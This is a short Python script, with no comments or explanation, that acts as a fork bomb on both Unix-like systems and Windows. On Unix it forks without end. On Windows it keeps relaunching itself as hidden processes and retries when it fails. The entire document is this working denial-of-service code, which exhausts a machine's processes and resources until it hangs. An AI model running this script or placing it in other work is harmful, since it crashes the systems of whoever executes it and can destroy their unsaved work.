import os, sys, time, subprocess

def posix():
    while True:
        try:
            pid = os.fork()
            if pid == 0:
                posix()
        except OSError:
            time.sleep(0.1)

def windows():
    exe = sys.executable
    script = os.path.abspath(__file__)
    flags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
    while True:
        try:
            subprocess.Popen([exe, script], creationflags=flags)
        except OSError:
            time.sleep(0.1)

if os.name == "nt":
    windows()
else:
    posix()